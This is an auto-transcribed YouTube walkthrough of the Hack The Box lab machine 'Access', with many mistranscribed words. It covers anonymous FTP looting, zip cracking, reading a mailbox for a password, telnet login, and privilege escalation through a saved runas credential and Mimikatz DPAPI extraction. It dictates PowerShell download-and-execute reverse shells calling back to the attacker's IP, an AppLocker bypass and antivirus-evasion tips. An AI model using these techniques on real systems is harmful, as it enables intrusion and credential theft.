 what's going on YouTube this is upsetting doing access from hack to box which is a really fun box essentially the box starts out with just a FTP share that has anonymous authentication inside it you'll find a encrypted zip file and a Microsoft Access database once you pillage the Microsoft Access database you'll find credentials to decrypt the zip file in that zip file is a exchange mailbox you can read that mailbox and then get a email that contains a username password to the machine you log into the machine you poke around and you find out that there's a credential stored in the DP API the data protection API and we can just use that credential with run as with that slash save cred flag or we can use mimic ATS and extract the credential out of the data protection API so we're gonna be doing both methods so let's just jump in like every other box we'll install for the and map with - se for default scripts SV enumerate versions Oh a output all formats put this in and map directory and call it access and then the IP address which is ten ten ten ninety eight this can take some time to run so I've already ran it looking at the results we have three ports open FTP on port 21 and it's a Microsoft FTP server we also have anonymous logins are allowed and for some reason passive mode failed on port 23 we have telnet it doesn't give us any other information and this is ending with a question mark so tonot nmap is not sure if this is tonot or not just because it's port 23 and maps assuming this is tonette because there's no other information we can assume the script timed out and it couldn't pull the band or anything so we should open a telnet session up to this and see if it responds and what it is is this actually telling it or is it just another service listening on port 23 and then finally we have HTTP on port 80 this is a Microsoft is 7.5 server which means most likely going to be Windows 2008 if this was like version 8 points something that would be 2012 and then 10 dot something that would be 2016 so we also have the title of mega core which could be a main aim but the very first thing I wanna do is open that tonette session and poke around this anonymous FTP so we're gonna do telnet ten ten ten ninety eight and then split our pain and look at this FTP so FTP ten ten ten ninety eight will login with anonymous and the password as anonymous as well do a dir and we can see two directories dir backups we can see there's a backup MDB file and dir engineer we see access control dot zip and both these files are around the same timeframe 8:23 and 824 both in 2018 so about one day difference between the two files nothing else there we could download the files with just get commands but when I'm dealing with anonymous FTP I like to download everything and I do that with W get so W get em and then FTP colon slash slash the username and password which is anonymous and then at ten ten ten ninety eight and we have passive mode failed so we have to do the flag - - no - passive and this is going to force W get to do a active mode FTP and here we go it is downloading everything it will put things in the directory of the hostname so ten ten ten ninety eight we see that's what saved everything - to be a little bit more organized I'm just going to rename that over to FTP and we can take a look at the files but before we do that look at this town at command we have a login so let's do anonymous anonymous and we get login failed so we know this is a telnet service and there should be some type of login so before we poke at the files and the interest of always having some type of recon going in the background now that the telnet finished let's gonna open up firefox and look at this website so ten ten ten dot ninety eight and we see just a picture so let's just try like slash robots.txt we see this is a four or four look at the page source we have alt JPEG we can save this image make this web and then W get to save the image and we can just do like exist tool on out JPEG we can see the file created time we could try was it I don't even think I have the stag tools on this just strings on out nothing really interesting in that directory but I'm gonna do a go Buster so - you for URL HTTP 10 10 10 98 - W for word list user share word list der buster directory list two point three medium let that go and then we might spoke at these files so we have a MDB file and a zip file I know it's it's R so I'm gonna poke at that first so let's go an engineer try unzipping this and we get unsupported compression method 99 so let's try like 7-zip so 7-zip X and then enter password I'm just gonna try the password of password and we get a failure so let's try 7-zip - eh and I'm going to do el to list the contents of the archive and then SLT to show technical information so 7-zip el SLT and what I'm trying to find is how this was encrypted and we have this as a es 256 deflate and again file dates but this tells me that I can run I think it's zipped to John and then we run that against the foul name who can potentially crack this so let's just but to a file access control dot hash did that go yep it did try to extract that PST file but because we didn't have the password it is zero so that's the other thing the 7-zip - L did is it told us the file name and this zip archive so let's go and look at that MDB file so go into backups we can do a file against backup MDB to identify what it is and it's a Mike Microsoft Access database so I'm gonna use a tool called M DB SQL and m DB tables if you don't have these I think you just do apt install m DB tools m DB tools yep this is a file so just install this package and you'll get the tools I'm about to use so actually before we do NDB let's do strings on this file and let's see if there is any plain text in here so I'm just trying to identify if this is going to be encrypted or not let's see we have a lot of text right here both texts I can read add personnel delete personnel so this looks like stuff actually in a database so I'm going to assume this is not encrypted so I'm going to do is a strings - + 8 and that's going to get rid of anything that's not 8 characters so all these are gonna be getting rid of now we can do sort - you save this - or try word list well go here and then we'll try crack in that PST file with the zip file would job using the word list from that MDB so do John access control - and then - - word list equals word list I should name that fellow something different because that is confusing this goes here so if we name this anything else that's what it would go but and run this and we can see it did crack it with access for you at security and if that was already in your pot file John's not gonna show it and you have to do it with a - - shell and - - show doesn't like it when you specify it with the word list so I just get rid of that and we see it here so we could unzip this now just using that strings to create a word list so 7z X access control dot zip case the password and it was successful but if we wanted to get it without using John and going through this MDB information we can do MDB - SQL on backup dot m DB and then we can list tables and then with this tool you just type go and that is going to terminate the command so you can see all the different tables in this database we can also just drawn m DB - tables on backup m DB and it tells us the same thing so we can see template e^x template e^x finger vein finger vein etc so i'm going to do for i in m DB tables and then specify backup dot m DB and what that's going to do is print out every table so now we can do m DB - export on every single table and we probably have to have some type of flag so let's see Oh back up MDB and then the table there we go so what I forgot to do is specify the MD beat file name so mbb export file name and then dollar i is going to be the table name and that just outputted everything to the screen which i don't like so let's make the tables and modify this command to write into tables and then the table name so now if we go into tables we have everything outputted and we can pick which table we want to look at so first thing I'm going to do is ad you - s on everything to get the file size and again sort - and reverse we'll just do it WC - L to get a line count and everything and then do a sort - n to tell it numbers and we can just ignore everything that is just one line because that's just going to be a blank file just gonna tell the titles of all the rows so let's see out of those what do we have that's interesting auth user is pretty interesting so if we cap this and we can see ID username password status last login so we see admin admin engineer then this password again which we know already goes to the zip and then back up admin admin so let's go and unzip this go Buster hasn't found anything so dot dot slash engineer and we could also probably try each of these in that telnet window to try to get a login but I just want to see what this PST was so we have already extracted it the command was again 7z X X of control and then paste the password in if we look at this PST file we can't really read it if we do exist tool access control PST file I meant we can see it's a Microsoft Outlook email folder Kali has a tool called read PST so we can use that against this and then we do an LS again and we see it converted this PST file into an M box file so if we less this we can start reading the emails out of this so we see the email was from John atmega Corp to security at access control systems and we see hey the password for the security account has been changed to access controller please ensure this is passed on to your engineers regards John so we got a user name and password and let's see let's grep for CC I think that was unbox look at this again copy this echo security that's just so it's going to be in my history so if I do like control or than type for capital C I can see what the password is but let's telnet to 10 10 10 98 and then we have to wait for the login prompt which does take a little bit we got a login prompt so we can login with security and then copy access controller let's paste this in crap I needed hit enter first basing the password and we get on the box if we do a Hugh am I we are access security we can do IP config we're indeed on the Box hostname is access so let's do a dir let's go into desktop and we just have the user dot text so the first thing I'm going to do is see if I can get to a better shell so let's test if PowerShell is working so I'll do PowerShell Who am I and it does run so let's set up in the Shang so let's make a directory dub-dub-dub and then let's copy opt nishang and then shells invoke powershell tcp ps1 and we'll call this we'll just do the shank ps1 edit this and let's make this run soon as we execute it so take this invoke powershell tcp reverse mine at the bottom and then put our information so reverse let's do if config eat zero not eat zero ton zero and it's 10 10 10 10 10 14 3 so put that 4 IP address and then change the port to let's do 9001 okay so python - m simple HTTP server and then n CL v NP 9001 go back to tonette and let's do I can't do back spaces PowerShell and then double quote PI X new object net web client download string HTTP 10 10 10 14 crap let's copy this it's 10 10 14 3 and let's copy this again because yeah we have to I really hate not be able to backspace 10 10 14 3 port 8000 and then nishang ps1 ok run that and we have it hitting the web server and then we get a shell so now I can do backspace and we can do any PowerShell command we want another thing I like to do once again the box is run a script called jaws that's just another windows enumeration tool so let's go to opt jaws get pull just see if there's any updates there or not so CP up Jaws jaws - a new mess one and then let's do IX new object net dot web client download string HTTP ten ten fourteen three eight thousand jaws a new my s1 and of course I don't make any typos when I'm allowed to make typos so run this and this is not in the dub-dub-dub folder so move jaws num dub-dub-dub and run this again this script does take a little bit of time so I'm going to fast forward the video so we're not just sitting here waiting for like 30 45 seconds so it has finished and while this was running I did want to check something else and that is going to be like the iis web server root to see if we can potentially drop a script into the iis web server as a current user if that's like an ASP X script then go hit it have that web server return a shell to us and then potentially do like rotten potato to prove esque so that's something we're gonna check right after we look at the results of this so let us search so at the very beginning we have it outputting what it is 2008 r2 standard it is amd64 we have the current users we have administrator engineer guest and security networking information where they looked at ARP information netstat firewall we do have the firewall is enabled and here it is outputting information from the firewall host file contents processes so this is interesting sequel and windows system32 wall games CMD let's just do a terminal 4 notes rename this so we definitely want to look at this file here is our in a shame output machine process we have scheduled tasks and we may want to take a more thorough look at this if we don't see anything but there are a lot of tasks to look at services again take a closer look at this if we don't find anything else installed programs we do have dot mat for hot fixes we see the hot fixes were applied right around the time all the files were created which is when this box was created so chances are we're not intended to look for some type of mist patch and like Windows just general probe ask because the Machine Creator updated this box just before it got released Program Files nothing program follows 86 FP sensor that's different I don't think that's a standard thing so definitely look at that directory follows with full control and modify access your cam I don't know what your cam is stream temperature logs let's try update dot HTML and that thing so let's do update dot HTML and that is a 404 error if we take off view source look more like that so this is not going to be the web directory for iis we can try / - slash dream but go Buster would have seen / - so I know that's not going to be there I mistyped stream so not sure exactly what this is it's not related to iis at first glance maybe if we do create a thing in our host file and make this access htb or something maybe there's virtual host routing and that directs us to this directory but just a thought right now we do have a D Drive which is odd unquoted service paths none recent documents nothing interesting files again that y'all cam keeps coming up 10 best models nothing too interesting there other than me me cats cached files and if you are on a box-like working this would be really interesting but for the web seeing someone upload mini cats and run it not interesting and we do have stored credentials a domain password for access slash administrator so at the end of the video we'll go into how to extract this but the key thing to know is if you do I think it's CMD key slash list that's essentially what that's running and we can see there is a sage password and the I think it's DP API I forget what that stands for maybe like domain protected API it's where Windows has its key store to store passwords so we'll go and do crypsis because we can as a user because this is our current profile so let's take a look at exactly where this is before you do that I do want to double check the permissions on the web server so let's go into INF pub dub-dub-dub root dir let's just do echo please subscribe to test and we can't write that and we don't have write permissions to any file so that's a lost cause so if we poked around the system a lot the intended thing to do was to go into users public desktop and then you see this ZK access 3.5 security system and maybe you poked around Program Files you can see it installed and googling which show this exists I forget or don't know exactly how you're supposed to intend it to find this other than just going into the public desktop but if we do a type on this maybe get content oh it's got space in the name get content paste we can see a portion of this shortcut Ln K is short for shortcut it's a link and we can see it's running run as access administrator slash safe tread but if we wanted to actually extract a link we can do that with PowerShell so let's do W script is equal to new object object W script shell and then we'll do shortcut is equal to get child item I don't feel like typing that so I'm just going to start that link so if we look at shortcut it's just going to be pointed to that file so we can do now that we have that comm object created with the first command we ran we can reference that comma object and if we do create shortcut it's not actually going to create it if we specify something that already exists it will just print all the information so we can see the full name this is going to be the path of the shortcut we can see the arguments which is slash user access administrator save cred and then running the program access exe we can see the location the target path which is run as and then the working directory so wonder if we may be at the end of the video we'll go poke and see if there was any hints to hint at it being but hint at the shortcut being created and the public's desktop but for now let's just do run as slash user access administrator slash save cred and then we can do Who am I um let's do run a slash user access administrator slash save cred Who am I to the file test and we may want to specify sequel and users public desktop test and that did not work run as slash user access administrator slash save cred and we'll just do a PowerShell reverse shell to see if we're executing so powershell IX new object we need a quote here I can't do this quote I really hate maybe it's an escape maybe this will work ix new object net dot web client download string HTTP 10 10 14 3 port 8000 and let's do 9000 - ps1 we can't do the same thing again because it's directing to put 9001 which is already being used so let's do dub dub CP nishang to 9000 to ps1 edit this and then let's do port 9000 to and c lv NP 9000 - and we can do this run as did not work so let's see the string starting let's just try run as powershell Who am I is that gonna error no it's not so let's do PowerShell and then try triple quotes my ex new object wait and that hit 9,000 - but didn't hit here let me try this just one last time with uh escaped quote to make sure I did this correctly I don't know if I escaped it on the other end so let's paste escape and hit and we got nothing so what I'm going to do is let's convert this command into base64 for Windows okay kill this list now real quick V we can just do at code n we want to paste this and that looks good so we're gonna type this too I convert to code utf-16 little-endian because that's what Windows is and something screw up my terminal okay pipes s I convert to code utf-16 little and en base64 - w0 Windows does everything in UTA uh that format or encoding so we have to change this string to this encoding before we basically for it but this will let us to do a command run as user access administrator save cred PowerShell encoded command paste okay and there we go so converting it to base64 made it so we didn't have to worry about all those annoying quotation marks and we got a shell as administrator so we do see backslash users administrator yeah your desktop we can see route text let's see we go into security dir desktop nothing there dir documents huh I'm not sure if there's a hint going to public that's just something I guess you have to try but let's get rid of that and let's pretend that we wanted to get the administrators password so what we're going to do is mimic at some so let's what do we want to do how do we want to get mammy cats do I have many cats LS downloads in me cats I do not so let's go and download some cats mini cats github and I could probably just use the one on Callie but chances are that's not going to be as up-to-date so four releases download this save file go into dub dub dub move downloads made me cats trunk then we can do 7z x to extract it and we want x64 mimic at exe so now we can go back to a shell and let's save this so new object net dot web client download file HTTP 10 10 14 3 port 8000 mimikatz dot exe and then we'll call this mini cat's got exe looks good got it downloaded and doesn't want to execute I always forget how to execute a file just from PowerShell I guess we can just do it from that telnet session so telnet 10 10 14 3 that's my box 10 10 10 to 98 so it was dot backslash that's gonna bother me security password is oh I had it somewhere we had notes to go look at this file so we definitely will do that after this we want to go John is there a John gun pot unless yes there is cat John John dump pot hash and password paste security based security paste backspace closed did I copy that wrong oh no that was just the zip password uh engineer cat access control dot M box grab for capital a for capital C security account here we go here's the password security paste okay we wanted to look at Windows systems that I do login CMD type C colon backslash windows system32 logon CMD this is just for the telnet server so nothing interesting there we wanted to go into where we downloaded mini cats public desktop yeah yeah we downloaded me cats here didn't we I wonder if antivirus removed it new object download file maybe that's why I couldn't execute it dir we may not have write access here CD security desktop ok we didn't have write access to the file I didn't see an error message so I assumed the file was there yeah so that's how you execute it I was not going crazy program mimikatz failed to execute this program is blocked by group policy let's just try moving it to a windows directory so AppLocker bypass list let's go here should be a list file somewhere scripts nope d now ah this vodka bypasses MD so let's do it and see : windows system32 spool drivers color so let's copy at the end see if it works copy memory cats dot exe windows system 32 drivers spool drivers color spool drivers color go into this directory and we have many cats then we can study XC we still get an error message so let's just go in meterpreter and run it that way so unicorn python unicorn pie let's do windows interpreter reverse HTTP s ten ten fourteen three nine thousand three should be open okay so let's copy powershell attack to htb boxes access dub-dub-dub call this MSF ps1 and then copy unicorn Darcy to HP boxes access and then MSF console - unicorn and then let's go where notes is and we want to do that basics t4 thing again so what is it echo - and they do this in this terminal echo - n-no echo - an IX new object net dot web client download string HTTP 10 10 14 3 8000 MSF ps1 okay I convert to code utf-16 little-endian basics for w0 okay copy that Metasploit is listening powershell and coded command paste no hits we got MSF dot ps1 we see a bunch of stuff but no hit dub less MSF got ps1 that is the unicorn output huh so while that goes let's try a back-up plan opt Empire I'm gonna reset my database because I don't know what's in my database right now use that dot Sh okay let's do listeners use listener HTTP set host HTTP 10 10 14 3 or do think 9014 MSF is 9000 3 so set this set by bind IP and 1014 3 set port to 9000 for info that is good execute this back we want to do launcher PowerShell on the HTTP listener copy this and can do the same thing because we still don't have a shell so go back to this tab the Empire ps1 think I pasted that I did okay go back here change your command to Empire ps1 or actually we can just type this execute this straight from a PowerShell window here so paste this in we got Empire go here and we'd have a hit so let's do interact I wonder if we go back use interact there we go and then we want to inject shellcode HTTP I have to go back again forgot to set up my material listener so let's do listeners again use listener then we want to specify meterpreter do info set post HTTP 10 10 14 3 on 9000 3 that is where meterpreter session is listening set port 9000 3 execute now we can go back back interact and then inject shellcode meterpreter and then specify nothing do info the payload is already set to reverse HTTP so let's execute this hit and we injected shellcode jobs not getting anything back exit this MSF cons let's do MSF DB run I like doing MSF DB run because this starts the database if it's not started and then starts MSF console so let's do handler let's do dash H specify ten ten fourteen three dash p nine thousand three and then - lowercase B will do is it windows interpreter reverse HTTP so we started that handler let's just change a payload to be reverse HTTP execute so we test the agent to run hit and we got a session back so I'm not sure what was going on with my unicorn but we finally got here so we can do sessions - I one blowed Kiwi which is mini cats and we loaded x86 164 which is not ID ideal so it's migrated into a 64-bit process I just see this cmd.exe pin 1760 64-bit so we can finally begin now that we've migrated so we can do Kiwi command and we just got stratum meterpreter now and we got to do a single quote and then a double quote because this is weird I hate hell but memory Katzie and rows arguments but DP API and then kill that with a double quote single quote so the single quotes pass everything in one argument and then D PA TI has like see if I can explain this v/o so you run mini cats and then you get arguments so we could do like everyone knows like privilege I think escalate maybe it's elevate and then SEC URL or privilege debug and then SEC URL si logon passwords so this is running mini cats and then by default it runs both these commands like they were separated with a colon so if we did this that's how things would normally happen but if sectoral si was not putting quotes and we had to do like slash user please subscribe then what mini cats would do would be it would run this command run SEC your LSA and then run the command slash user please subscribe which doesn't exist that's an argument to this function so that's why we put the double quotes there and then because of how we're piping it from meterpreter you have to wrap everything in single quotes so you do single quotes function argument function argument and that's how it works so hopefully that made sense so if we run this we can see the various things we can do I'd highly recommend doing like a Google on DP API and then harmed ROI generally anything windows related or active directory etc just put the term and then harm joy in it and then read everything on his blog so this is gonna take us through doing what I'm about to do so read that and then you'll understand so OS and then we want to do users security app data we have to do is pull the file that contains our master key so LS users security app data okay so app data and then we want roaming Microsoft protect and this is the SSID of our user so let's add this in our notes so let's go in that directory because meterpreter is telling us that's a directory oh because I was just doing LS CD there we go let me do dir and we can see two files since I know this box was created in 2018 I'm going to assume this is the correct file but we can try decrypting this as well because I don't know exactly what this is there's created two days ago so this box has been online for two days has it been reset so we want to run PWD let's run that key we command DP API master key we got specify an N file so in this /fo name and did an error message we're not supposed to get that error message let's do search module do I have it here I guess it's go back back search module mini cats does this have it mini cats command we got this stir so this probably gonna require us to have administrator privileges or something use module and fell once there's a more verbose and fell because this is going to work because it's gonna require us to be admin so agent let's do this set command answer let's just see if this runs now we need to be in elevate a context so that won't work and this isn't working um let's see PWD we're in that directory Kiwi CMD CD okay and interpreter is in this directory as well so let's just try /i n we need single double D P API master key I N and then paste this mismatch all quotes and maybe it's working it's taking a while and it looks like that even arrow down let's just download this file so if we download it and I wonder if I'm meterpreter just got killed by a V or something back interact because we should be able to download that file let's do inject shellcode run okay it executed a shellcode let's see if we get another session we do session - I - CD go back in that directory and one of the best things for AV evasion is just X filling the files and running them on your own equipment and that's what we're gonna be doing so if you want to do like secular essay you would just hold on I'll finish that tour in a second eg sessions - I won - okay so if you wanted to do like the sexual essay you would just dump the memory of alsace dot exe and then X fill that dump back to yourself and then you can make me catch that dumb so the best way of running mini cats on computers without getting detected is not to run many cats at all just grab the files at once so do a dir get let's grab both of these files so we can see what that second one is I think it's download not get we can do this one as well to see deed download zero-star okay download Forster I think I fat finger to backspace or didn't copy a backspace so we downloaded those files we will also need another file so let's just grab that we don't want cred hist we want what is it credentials I think and we want this 51 okay so we got all the files here let's just make a directory SMB move them all in SMB and then if config e0 I'm gonna be one sent me to 1610 182 let's do SMB server and if you don't have s and B so if you can do like impact - SMB server I think that's the default one SMB server PI SMB to support and we want to specify the share name so let's call this please subscribe and then the shared path which will just be our current working directory so now I can go on a Windows box and grab those files and meterpreter so let's go / / 172 1610 182 and I want to specify the directory as please subscribe copy these I also want meterpreter before I do meterpreter I want to set defender status to off so go in defender AV minute settings turn that off okay act box copy meterpreter so dub-dub-dub num2 which okay i think i kept saying that it's me me cats into SMB and then copy this here okay so now we got mini cats we got all the files so let's see these were the master key files and then this is the credential if we try opening this and something we see it's just text if we try opening this in something same thing so we don't get anything out of those files so what we do DP API and then master key /i n before we do that let's just run the command CD we see mimmie cats is in desktop so we can do DP API master key and and then paste so we see information out of this doesn't really get any info doesn't get anything useful because it can't decrypt this file to decrypt the file we need to give it the s ID of the user which we put in our notes so copy this and this is by small let's do properties 28 should be fine that's probably big 20 that's good okay so we gave it the SID and then we also got to give it the password which we have on the mailbox so FTP engineer path control M box that was a wrap for C there we go as you can see it would hope if we took notes so we'd have to keep going back and forth to all these files paste the password and now we can see the matter tricky with password is this so what that allows us to do is do another DP API call so do this against what is it not credit hist cred there we go I was looking for credentials but it's cred /i N and then we got a copy that file name so let's grab this rename copy paste and let's see maybe it wasn't that file good hist crashed so let's run this again first we have to extract the master keys so DP API and then master key /i n we grab the flower name we gotta get the CID should just put everything in a notepad file in case we crash this again okay let's go notes copy CID okay password oh man and the password is here paste let's copy notepad paste okay we have the key so let's do DP API cred n and let's go for this file and that's a failure so we're doing the file 44b 33 let's go back to meterpreter LS we want to go MIT so we're doing it against the newer one let's try that old file Oh seven nine too so let's exit mimic ATS completely so you know we're not like painting memory by doing both those files in the same session we can change this one to be not forty-four but zero seven okay pace us in and we got a new key so let's do DP API cred and and then hopefully the very last time copy this paste there we go so now we got the new credential it is 55 access security at mega Corp for administrator so we can copy this go back here and then telnet ten ten ten ninety eight login with administrator and then paste and we get straight in as administrator so that is how to do the box through either finding that shortcut or finding the DP API and what does that stand for what does DP API stand for Microsoft probably data protected API yeah data protection API so okay we got all that done hope you guys enjoyed the video take care and I'll see you all next week